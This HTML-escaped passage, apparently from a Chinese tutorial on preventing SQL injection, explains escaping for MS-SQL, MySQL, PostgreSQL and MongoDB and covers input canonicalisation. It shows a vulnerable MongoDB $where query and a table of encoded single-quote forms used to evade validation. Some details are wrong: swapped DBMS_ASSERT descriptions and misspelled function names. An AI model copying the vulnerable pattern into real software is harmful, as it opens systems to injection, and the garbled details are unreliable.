&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;DBMS_ASSERT.ENQUOTE_LITERAL&lt;/td&gt;
&lt;td&gt;该函数使用双引号来引用传递的参数。如果参数已被引用，就不做任何事情&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;DBMS_ASSERT.ENQUOTE_NAME&lt;/td&gt;
&lt;td&gt;如果未使用单引号引用用户提供的字符串，那么该函数会使用单引号来引用它&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h5 id=&#34;针对MS-SQL的编码&#34;&gt;&lt;a href=&#34;#针对MS-SQL的编码&#34; class=&#34;headerlink&#34; title=&#34;针对MS-SQL的编码&#34;&gt;&lt;/a&gt;针对MS-SQL的编码&lt;/h5&gt;&lt;p&gt;MS-SQL使用单引号作为字符串的结束符，因而有必要对包含在字符串（动态SQL中将包含该字符串）中的单引号进行编码。&lt;/p&gt;
&lt;p&gt;在MS-SQL中，可以通过使用两个单引号替换单个单引号的方法来实现编码目的。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-C#&#34; data-language=&#34;C#&#34;&gt;&lt;code class=&#34;language-C#&#34;&gt;sql = sql.replace(&#34;&#39;&#34;,&#34;&#39;&#39;&#34;)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;由于在Transact-SQL中需要为单引号添加引用符(因为它是字符串结束符)，因而在Transact-SQL中需要使用两个单引号来替换单个单引号。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-c#&#34; data-language=&#34;c#&#34;&gt;&lt;code class=&#34;language-c#&#34;&gt;SET @enc = replace(@input,&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;)
//使用字符编码表示上述内容逻辑性会更强，也更加清楚：
SET @enc = replace(@input, CHAR(39), CHAR(39) + CHAR(39));&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对LIKE字句的通配符转义&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;[&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;[[]&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;[%]&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;_&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;[_]&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a%&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 易受攻击。返回所有以&#34;a&#39;字符开头的用户&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a\%&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ESCAPE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;\&#39;
-- 不容易受攻击，返回用户&#39;&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,如果存在一个这样的用户的话
&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 使用ESCAPE子句时，可以指定任何单个字符作为转义字符&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;针对MySQL的编码&#34;&gt;&lt;a href=&#34;#针对MySQL的编码&#34; class=&#34;headerlink&#34; title=&#34;针对MySQL的编码&#34;&gt;&lt;/a&gt;针对MySQL的编码&lt;/h5&gt;&lt;p&gt;由于MySQL使用单引号作为字符串字面量的结束符，因而有必要对包含在字符串(动态SQL中将包含该字符串)中的单引号进行编码。&lt;/p&gt;
&lt;p&gt;在MySQL中，使用两个单引号替换单个单引号来实现编码目的，也可以使用反斜线()来引用单引号。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PHP还提供了mysql_real_escape()函数。该函数会自动使用反斜线来引用单引号及其他具有潜在危害的字符，例如0x00(NULL)、换行符(\n)、回车符(\r)、双引号(“)、反斜线() 和 Ox1A(Ctrl+Z)&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token function&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;由于需要为单引号添加引用符(因为它是字符串结束符)，因而在存储过程代码中需要使用两个单引号来替换单个单引号。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-C#&#34; data-language=&#34;C#&#34;&gt;&lt;code class=&#34;language-C#&#34;&gt;SET @sql = REPLACE(@sql,&#39;\&#39;&#39;,&#39;\\\&#39;&#39;)
//使用字符编码表示上述内容逻辑性会更强，也更加清楚：
SET @enc = REPLACE(@input, CHAR(39) , CHAR(92, 39));&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对LIKE字句的通配符转义&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\%&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;_&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\_&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;针对PostgreSQL的编码&#34;&gt;&lt;a href=&#34;#针对PostgreSQL的编码&#34; class=&#34;headerlink&#34; title=&#34;针对PostgreSQL的编码&#34;&gt;&lt;/a&gt;针对PostgreSQL的编码&lt;/h5&gt;&lt;p&gt;PostgreSQL也使用单引号作为字符串字面量的结束符，可以采用两种办法对单引号进行编码。&lt;/p&gt;
&lt;p&gt;第一种方法使用两个单引号替换一个单引号。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$encodedValue&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#39;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第二种办法是使用一个反斜线对单引号进行编码，但PostgreSQL还需要在字符串字面量之前放置一个大写的E字母&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-plsql&#34; data-language=&#34;plsql&#34;&gt;&lt;code class=&#34;language-plsql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; User &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; LastName&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;E&lt;span class=&#34;token string&#34;&gt;&#39;O\&#39;Boyle&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在PHP中，可以使用add_slashes()或str_replace()方法对反斜线执行编码。在PHP中，对于PostgreSQL数据库而言，最佳的字符串编码方式是使用pq_escape_string()方法：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$encodedValue&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pg_escape_string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;该函数将调用libpq的PQescapeString()方法，它将把单反斜线替换为双反斜线，并且用两个单引号替换一个单引号&lt;/p&gt;
&lt;p&gt;在PostgreSQL中还可以采用其他办法创建字符串字面量，即使用$字符。$字符允许开发人员在SQL语句中使用类似于标记(tag-like)的功能。下面就是一个使用这种语法创建的字符串：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;User&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; LastName&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;$quote$O&#39;Boyle$quote$&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在这种情况下，对于用户输入的任何一个$字符，都需要确保使用一个反斜线进行转义处理： &lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$encodedValue&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;$&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\\$&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;防止NoSQL注入&#34;&gt;&lt;a href=&#34;#防止NoSQL注入&#34; class=&#34;headerlink&#34; title=&#34;防止NoSQL注入&#34;&gt;&lt;/a&gt;防止NoSQL注入&lt;/h5&gt;&lt;p&gt;在NoSQL的查询API中，绝大多数方法都提供了将数据与代码清晰分离的方法。例如，当从PHP中使用MongoDB时，典型的方法是使用关联数组(associative array)插入数据：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$users&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;insert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;username&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;password&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;查询则如下所示：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$user&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$users&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;findOne&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;username&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当使用这些API时，由于避免了使用字符串连接来构造查询，因此防止了注入攻击。&lt;/p&gt;
&lt;p&gt;对于更高级的查询，MongoDB允许开发人员使用$where关键字提交一个JavaScript函数：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$collection&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\$where&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;function(){ return this.username.indexOf(&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$test&lt;/span&gt;&lt;/span&gt;&#39;) &amp;gt; -1 }&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;该JavaScript函数很容易遭到注入攻击。攻击者可以转义indexOf()内的字符串，并改变查询执行的方式。为了防止这种攻击，我们必须对JavaScript进行编码。使用十六进制的\xnn编码类型，或使用\unnnn类型的Unicode编码，对所有非字母或数字的字符全部进行转 义，这是最安全的办法。&lt;/p&gt;
&lt;h3 id=&#34;规范化&#34;&gt;&lt;a href=&#34;#规范化&#34; class=&#34;headerlink&#34; title=&#34;规范化&#34;&gt;&lt;/a&gt;规范化&lt;/h3&gt;&lt;p&gt;避开输入验证和输出编码的常用技术是：在将输入发送给应用程序之前对其进行编码，之后再对其进行解码和解释以符合攻击者的目标。&lt;/p&gt;
&lt;p&gt;单引号的例子&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;表示&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;编码类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;%27&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;URL编码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;%2527&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;双URL编码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;%%317&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;嵌套的双URL编码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;%u0027&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Unicode 表示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;%u02b9&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Unicode 表示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;%ca%b9&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Unicode 表示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&amp;amp;apos&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;HTML实体&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&amp;amp;#39&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;十进制HTML实体&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&amp;amp;#x27&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;十六进制HTML实体&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;%26apos&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;混合的URL/HTML编码&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;规范化是指将输入简化成标准或简单的形式，例如变成单引号&lt;/p&gt;
&lt;h4 id=&#34;规格化方法&#34;&gt;&lt;a href=&#34;#规格化方法&#34; class=&#34;headerlink&#34; title=&#34;规格化方法&#34;&gt;&lt;/a&gt;规格化方法&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;拒绝所有不符合格式的输入，例如利用白名单拒绝所有编码输入&lt;/li&gt;
&lt;li&gt;对输入多次解码，或者解码一次，若还需解码就抛弃&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;适用于Unicode的方法&#34;&gt;&lt;a href=&#34;#适用于Unicode的方法&#34; class=&#34;headerlink&#34; title=&#34;适用于Unicode的方法&#34;&gt;&lt;/a&gt;适用于Unicode的方法&lt;/h5&gt;&lt;p&gt;遇到像UTF-8这样的Unicode输入时，一种方法是将输入标准化（normalization）。该方法使用定义好的规则集将Unicode转换成最简单的形式。将双倍宽度及其他的Unicode编码在它们所处的位置转换成各自的ASCII 等价形式。&lt;/p&gt;
&lt;p&gt;使用Java中的Normalizer类（Java 6及以上版本）来将输入标准化&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;normalized &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Normalizer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;normalize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;input&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Normalizer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Form&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;NFKC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用C#中String类的Normalize方法来将输入标准化&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-c#&#34; data-language=&#34;c#&#34;&gt;&lt;code class=&#34;language-c#&#34;&gt;normalized = input.Normalize(NormalizationForm.FormKC);&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用PHP中PEAR库的PEAR::I18N_UnicodeNormalizer包来将输入标准化&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$normalized&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name static-context&#34;&gt;I18N_UnicodeNormalizer&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;toNFKC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;UTF-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

